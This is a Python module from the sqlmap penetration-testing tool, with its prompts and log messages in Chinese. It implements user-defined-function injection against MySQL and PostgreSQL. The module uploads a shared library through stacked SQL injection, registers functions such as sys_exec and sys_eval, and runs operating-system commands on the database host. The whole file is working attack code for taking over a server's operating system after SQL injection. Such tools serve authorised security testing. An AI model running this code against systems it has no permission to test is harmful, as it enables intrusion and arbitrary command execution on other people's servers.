#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import dataToStdout
from lib.core.common import isDigit
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.compat import xrange
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.exception import SqlmapUserQuitException
from lib.core.unescaper import unescaper
from lib.request import inject

class UDF(object):
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf = set()
        self.udfs = {}
        self.udfToCreate = set()

    def _askOverwriteUdf(self, udf):
        message = "UDF '%s' 已经存在,你想要覆盖它吗？[y/N] " % udf

        return readInput(message, default='N', boolean=True)

    def _checkExistUdf(self, udf):
        logger.info("检查 UDF '%s' 是否已经存在" % udf)

        query = agent.forgeCaseStatement(queries[Backend.getIdentifiedDbms()].check_udf.query % (udf, udf))
        return inject.getValue(query, resumeValue=False, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY)

    def udfCheckAndOverwrite(self, udf):
        exists = self._checkExistUdf(udf)
        overwrite = True

        if exists:
            overwrite = self._askOverwriteUdf(udf)

        if overwrite:
            self.udfToCreate.add(udf)

    def udfCreateSupportTbl(self, dataType):
        debugMsg = "正在创建支持用户定义函数的表"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, dataType)

    def udfForgeCmd(self, cmd):
        if not cmd.startswith("'"):
            cmd = "'%s" % cmd

        if not cmd.endswith("'"):
            cmd = "%s'" % cmd

        return cmd

    def udfExecCmd(self, cmd, silent=False, udfName=None):
        if udfName is None:
            udfName = "sys_exec"

        cmd = unescaper.escape(self.udfForgeCmd(cmd))

        return inject.goStacked("SELECT %s(%s)" % (udfName, cmd), silent)

    def udfEvalCmd(self, cmd, first=None, last=None, udfName=None):
        if udfName is None:
            udfName = "sys_eval"

        if conf.direct:
            output = self.udfExecCmd(cmd, udfName=udfName)

            if output and isinstance(output, (list, tuple)):
                new_output = ""

                for line in output:
                    new_output += line.replace("\r", "\n")

                output = new_output
        else:
            cmd = unescaper.escape(self.udfForgeCmd(cmd))

            inject.goStacked("INSERT INTO %s(%s) VALUES (%s(%s))" % (self.cmdTblName, self.tblField, udfName, cmd))
            output = unArrayizeValue(inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, firstChar=first, lastChar=last, safeCharEncode=False))
            inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        return output

    def udfCheckNeeded(self):
        if (not any((conf.fileRead, conf.commonFiles)) or (any((conf.fileRead, conf.commonFiles)) and not Backend.isDbms(DBMS.PGSQL))) and "sys_fileread" in self.sysUdfs:
            self.sysUdfs.pop("sys_fileread")

        if not conf.osPwn:
            self.sysUdfs.pop("sys_bineval")

        if not conf.osCmd and not conf.osShell and not conf.regRead:
            self.sysUdfs.pop("sys_eval")

            if not conf.osPwn and not conf.regAdd and not conf.regDel:
                self.sysUdfs.pop("sys_exec")

    def udfSetRemotePath(self):
        errMsg = "在插件中必须定义udfSetRemotePath()方法"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfSetLocalPaths(self):
        errMsg = "在插件中必须定义udfSetLocalPaths()方法"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def udfCreateFromSharedLib(self, udf, inpRet):
        errMsg = "在插件中必须定义udfCreateFromSharedLib()方法"
        raise SqlmapUnsupportedFeatureException(errMsg)


    def udfInjectCore(self, udfDict):
        written = False

        for udf in udfDict.keys():
            if udf in self.createdUdf:
                continue

            self.udfCheckAndOverwrite(udf)

        if len(self.udfToCreate) > 0:
            self.udfSetRemotePath()
            checkFile(self.udfLocalFile)
            written = self.writeFile(self.udfLocalFile, self.udfRemoteFile, "binary", forceCheck=True)

            if written is not True:
                errMsg = "上传共享库时出现问题,似乎二进制文件未写入数据库底层文件系统"
                logger.error(errMsg)

                message = "您是否仍要继续？请注意,操作系统接管将失败 [y/N] "

                if readInput(message, default='N', boolean=True):
                    written = True
                else:
                    return False
        else:
            return True

        for udf, inpRet in udfDict.items():
            if udf in self.udfToCreate and udf not in self.createdUdf:
                self.udfCreateFromSharedLib(udf, inpRet)

        if Backend.isDbms(DBMS.MYSQL):
            supportTblType = "longtext"
        elif Backend.isDbms(DBMS.PGSQL):
            supportTblType = "text"

        self.udfCreateSupportTbl(supportTblType)

        return written

    def udfInjectSys(self):
        self.udfSetLocalPaths()
        self.udfCheckNeeded()
        return self.udfInjectCore(self.sysUdfs)

    def udfInjectCustom(self):
        if Backend.getIdentifiedDbms() not in (DBMS.MYSQL, DBMS.PGSQL):
            errMsg = "UDF注入功能仅适用于MySQL和PostgreSQL"
            logger.error(errMsg)
            return

        if not isStackingAvailable() and not conf.direct:
            errMsg = "UDF注入功能需要堆叠查询SQL注入"
            logger.error(errMsg)
            return

        self.checkDbmsOs()

        if not self.isDba():
            warnMsg = "由于当前会话用户不是数据库管理员,所以请求的功能可能无法正常工作"
            logger.warning(warnMsg)

        if not conf.shLib:
            msg = "共享库的本地路径是什么？"

            while True:
                self.udfLocalFile = readInput(msg)

                if self.udfLocalFile:
                    break
                else:
                    logger.warning("您需要指定共享库的本地路径")
        else:
            self.udfLocalFile = conf.shLib

        if not os.path.exists(self.udfLocalFile):
            errMsg = "指定的共享库文件不存在"
            raise SqlmapFilePathException(errMsg)

        if not self.udfLocalFile.endswith(".dll") and not self.udfLocalFile.endswith(".so"):
            errMsg = "共享库文件必须以'.dll'或'.so'结尾"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".so") and Backend.isOs(OS.WINDOWS):
            errMsg = "您提供的共享对象作为共享库,但数据库底层操作系统是Windows"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        elif self.udfLocalFile.endswith(".dll") and Backend.isOs(OS.LINUX):
            errMsg = "您提供的动态链接库作为共享库,但数据库底层操作系统是Linux"
            raise SqlmapMissingMandatoryOptionException(errMsg)

        self.udfSharedLibName = os.path.basename(self.udfLocalFile).split(".")[0]
        self.udfSharedLibExt = os.path.basename(self.udfLocalFile).split(".")[1]

        msg = "您想从共享库中创建多少个用户定义函数？"

        while True:
            udfCount = readInput(msg, default='1')

            if udfCount.isdigit():
                udfCount = int(udfCount)

                if udfCount <= 0:
                    logger.info("没有能注入的内容")
                    return
                else:
                    break
            else:
                logger.warning("无效值,仅允许数字")

        for x in xrange(0, udfCount):
            while True:
                msg = "第%d个用户定义函数的名称是什么？" % (x + 1)
                udfName = readInput(msg)

                if udfName:
                    self.udfs[udfName] = {}
                    break
                else:
                    logger.warning("您需要指定UDF的名称")

            if Backend.isDbms(DBMS.MYSQL):
                defaultType = "string"
            elif Backend.isDbms(DBMS.PGSQL):
                defaultType = "text"

            self.udfs[udfName]["input"] = []

            msg = "UDF '%s'接受多少个输入参数？(默认值:1)" % udfName

            while True:
                parCount = readInput(msg, default='1')

                if parCount.isdigit() and int(parCount) >= 0:
                    parCount = int(parCount)
                    break

                else:
                    logger.warning("无效值,仅允许大于等于0的数字")

            for y in xrange(0, parCount):
                msg = "输入参数%d的数据类型是什么？(默认值:%s)" % ((y + 1), defaultType)

                while True:
                    parType = readInput(msg, default=defaultType).strip()

                    if parType.isdigit():
                        logger.warning("您需要指定参数的数据类型")

                    else:
                        self.udfs[udfName]["input"].append(parType)
                        break

            msg = "返回值的数据类型是什么？(默认值:%s)" % defaultType

            while True:
                retType = readInput(msg, default=defaultType)

                if hasattr(retType, "isdigit") and retType.isdigit():
                    logger.warning("您需要指定返回值的数据类型")
                else:
                    self.udfs[udfName]["return"] = retType
                    break

        success = self.udfInjectCore(self.udfs)

        if success is False:
            self.cleanup(udfDict=self.udfs)
            return False

        msg = "您是否要立即调用您注入的用户定义函数？[Y/n/q] "
        choice = readInput(msg, default='Y').upper()

        if choice == 'N':
            self.cleanup(udfDict=self.udfs)
            return
        elif choice == 'Q':
            self.cleanup(udfDict=self.udfs)
            raise SqlmapUserQuitException

        while True:
            udfList = []
            msg = "你想调用哪个 UDF 函数？"

            for udf in self.udfs.keys():
                udfList.append(udf)
                msg += "\n[%d] %s" % (len(udfList), udf)

            msg += "\n[q] 退出"

            while True:
                choice = readInput(msg).upper()

                if choice == 'Q':
                    break
                elif isDigit(choice) and int(choice) > 0 and int(choice) <= len(udfList):
                    choice = int(choice)
                    break
                else:
                    warnMsg = "无效的值,只允许输入大于等于1且小于等于%d的数字" % len(udfList)
                    logger.warning(warnMsg)

            if not isinstance(choice, int):
                break

            cmd = ""
            count = 1
            udfToCall = udfList[choice - 1]

            for inp in self.udfs[udfToCall]["input"]:
                msg = "参数%d的值是多少(数据类型:%s)？" % (count, inp)

                while True:
                    parValue = readInput(msg)

                    if parValue:
                        if "int" not in inp and "bool" not in inp:
                            parValue = "'%s'" % parValue

                        cmd += "%s," % parValue

                        break
                    else:
                        logger.warning("您需要指定参数的值")

                count += 1

            cmd = cmd[:-1]
            msg = "你想要获取 UDF 的返回值吗？[Y/n] "

            if readInput(msg, default='Y', boolean=True):
                output = self.udfEvalCmd(cmd, udfName=udfToCall)

                if output:
                    conf.dumper.string("返回值", output)
                else:
                    dataToStdout("无返回值\n")
            else:
                self.udfExecCmd(cmd, udfName=udfToCall, silent=True)

            msg = "你想要调用这个注入的 UDF 还是另一个 UDF？[Y/n] "

            if not readInput(msg, default='Y', boolean=True):
                break

        self.cleanup(udfDict=self.udfs)
